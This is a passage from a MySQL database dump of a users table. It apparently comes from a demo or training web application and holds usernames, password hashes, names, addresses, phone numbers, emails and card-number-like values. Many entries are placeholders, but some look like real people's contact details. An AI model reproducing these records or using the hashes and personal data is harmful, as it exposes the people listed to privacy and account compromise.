city','toyland','19','12345','098-433555','pooki@toyland.com','232142142241','2007-02-07 17:00:00',0,0,19780203,0,0),('146fb6b6c38e26e3558e789e5a7638ef','superman','edfdb7b6adc74b7aa45659190f43373b','superman','Superway 80','Superville','Supreme','71','454334','04-1242442','superman@krypton.com','94589459834','2007-02-07 17:00:00',0,0,19000203,0,2),('f2ef380b83861160e79f1f06c0b02106','jgeorge','15b5f14a17d746faebaaad3e10b56f12','John George','8992 Preston Rd','Frisco','Tx','221','75034','972-987-5640','j.george@f5.com','1234567890','2004-08-03 17:00:00',0,0,19711010,0,2),('266110db14ef8f3e2766ad277b6c9d56','charlie','250681f6cba7032f0bee68cd0147d5bd','Charlie Cano','42 Madison Ave','New york','NY','221','10010','1111111111','ccano@magnifire.com','1111111111111111','2004-08-05 17:00:00',0,0,19000101,0,2),('346a7ec7956d65a6e1e8a6307bd84ccc','timtim','7aee10e320b1a22fd131dc01f1bf19f5','Tim','12112 tim','Tim','Tx','221','75034','123-123-2345','Tim@home.com','12312341234534563457','2004-08-11 07:33:18',0,0,19701210,0,2),('46353d8e34feb49c328495d509e61e82','roadrunner','27ac9db4d2c24f8c7a6a12ace96b95f5','emi','none of your bussiness 12','tlv','banana','131','56789','9876543','emi@magnifire.com','987654321987654321','2004-12-01 08:22:00',0,0,19740503,0,2),('aa327f9d364a9e18f5a99ce100fb3f1a','waltons','95ba64d5f7a05b021254ae8f63351514','Jon Greer','1212 Prairie Lane','Boondocks','NC','221','43321','704-555-1212','j.greer@f5.com','1234567823456789','2004-08-16 17:00:00',0,0,19711028,0,1),('5579831eca129b3dd594c5da7ad9a353','student17','10ca094fd6c80990a6669f27e57c532c','Student17','401 Elliott Ave. West','Seattle','WA','221','98119','(888) 882-4447','student17@f5training.com','1234-5678-9012-3456','2004-09-13 17:00:00',0,0,19630117,0,2),('328821eec5c280b51d11e006af9a7a94','george','f449e60d644ebe4ccb75d19867321b4c','John George','1234 home','Texas','Texas','221','75034','123-345-5678','john.george@comcast.net','123423348394802384','2004-10-04 17:00:00',0,0,19711010,0,2),('6cd892e6ca10a4f29a04950788338c52','ksalchow','fdff846895f11d4270094c3ff281a341','ksalchow','2258 Belfast Street West','Rosemount','MN','221','55068','651-423-1133','k.slchow@f5.com','1234-5678-8765-4321','2004-10-14 17:00:00',0,0,19691204,0,2),('ec0bdd62afd14e44ec8d29bbdb6523a3','georgejg','7a835e605683cc5bb795e1d3cf3568b7','john George','1234 Home','Frisco','TX','221','75034','972-987-5640','jgeorge@f5.com','1234545667788','2004-10-18 17:00:00',0,0,19711010,0,2),('cfb421eb8834013218f680435d044d0f','Creed666','2e2f9db21076d94b4c366d3e0f1cd75c','creed','wc','wc','wa','221','90210','666','creed666@hotmail.com','6666666666','2004-11-29 04:05:15',0,0,19660401,0,1),('405e895664897e1d233896bb31a18ac6','athibaud','1c9827245fdcbbdcc09532c80e953b54','alain thibaud','rue paris','montigny','12','75','78190','+33139303890','alain@f5.com','1234567890123456','2004-12-01 10:15:16',0,0,19641111,0,0),('f0eeeab703bc1f468cd0da2cac6a1ec3','alfredo','dea1940cd83433952725c3992e6774f1','alfredo','street.10','Tel Aviv','BLA','101','1234','1234','a@b.de','1234','2004-11-28 17:00:00',0,0,19502002,0,2),('4572050b6cecf079b84c2c9291364b7e','newuser','bd5c6f4c75596f7714d8c43bce449c08','newuser','12 rue d\'effectuer','la france','QW','1','12wert','+45192834389','newuserts@laposte.fr','1234 9876 5678 8764','2004-11-30 17:00:00',0,0,19011111,0,1),('c23fcb27b5e70773b6e9f5552d5a24a9','bruno74','f513a1e699289929293045f399b24dbc','Bruno','big white house','sandwich','IL','221','61655','888 555 1212','bruno@f5.com','4698 3658 6598 4587','2004-12-01 17:00:00',0,0,19650505,0,0),('4304f7ec1df6021ee0dfb47f197279e0','hampton','0ed085bde8b40cd109067bdb66ea7663','Bruce Hampton','123 Any Street','Sunrise','MN','221','55123','612-240-1777','bruce.hampton@milestonesystems.com','1234-5678-9101-1213','2004-12-20 17:00:00',0,0,19010101,0,2),('2c147553c12c5fbc088458b9134237fd','bigsexy','13493d6742120314cf09dbb499d0987a','bigsexy','123 This Side of the Tracks','New York','NY','221','12345','515-555-5555','bigsexy@playapimps.com','123456789','2004-12-26 17:00:00',0,0,19660606,0,0),('5205511317c11dcc9e33eae002af54e7','scottg','74c14e90ef71a78aeed3d8225220d261','scottg','123 Where Else but Here St','NextCountyOver','UT','221','12345','515-555-5555','scott@scott.com','1234567897','2004-12-26 17:00:00',0,0,19690609,0,0),('112e0f1f227b1d0958f526d48b7188c6','kellogs','bd5c6f4c75596f7714d8c43bce449c08','Pui Edylie','Singapore','Singapore','Singapore','188','310217','+6598759599','email@edylie.net','123456','2005-01-04 17:00:00',0,0,19780111,0,2),('15abb3d50c0f49c5b4b72bdb7fc823ef','zivoshka','cdee0b11e27c3be1dc7d0e2e03d921e6','Ziv','Blah','blah','blah','105','11111','00000000','z.saar@f5.com','123456','2005-01-24 10:50:48',0,0,11970203,0,1),('f567e3668f1926d18642305ae485fa96','bubabuba','8c38a19cdf80c9a5beaf9f95d1e0a2b1','buba','cxckdnaknfd','knknkfdan','dfd','23','242424','4224424','zivoshka@gmail.com','663436633','2005-01-09 11:41:55',0,0,19550305,0,2),('9246a2c44035739b7566e1a8ca5dc964','edylie','35e595ea0f6423f0e6a26c1414ba856f','edy','singapore','singapore','Singapore','188','310217','6598759599','emailme_okie@yahoo.com','123456','2005-01-09 17:00:00',0,0,19781101,0,2),('cb5d95e954f1ad7bd3ca9893002d351c','bregerido','8f8052524ca404309fb6c8a230ade922','Ido','3 h dt','Tel Aviv','none','105','10010','1234567','ido@f5.com','1111444455556666','2005-01-11 17:00:00',0,0,19711212,0,2),('79111ff01a3a4d6edec4c0b13c9e95af','alaskajoe','903a0d1a7731bee0b191efcc42267fa1','Joe Jordan','124','seattle','wa','221','98144','272-6602','j.jordan@f5.com','1234567890101011','2005-01-12 17:00:00',0,0,19690831,0,0),('622b3ae20d9bad8cee7d85134f65c123','coyote','27ac9db4d2c24f8c7a6a12ace96b95f5','mel ','hacker st, 13','Hackerville','none','1','34565','98765467898765','hack@magnifire.com','7654567876678654','2005-01-19 17:00:00',0,0,19200309,0,2),('c51e53891e382c3191a47e5f1592a48a','muserr','c8082eeeaa8fe881eb72fe4521d39700','Dmitry','gdgdfg','gdgdfg','gdgdfg','218','18010','56456564566','pro@2upost.com','11111','2005-01-19 17:00:00',0,0,18041010,0,2);
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2011-12-22 23:30:52
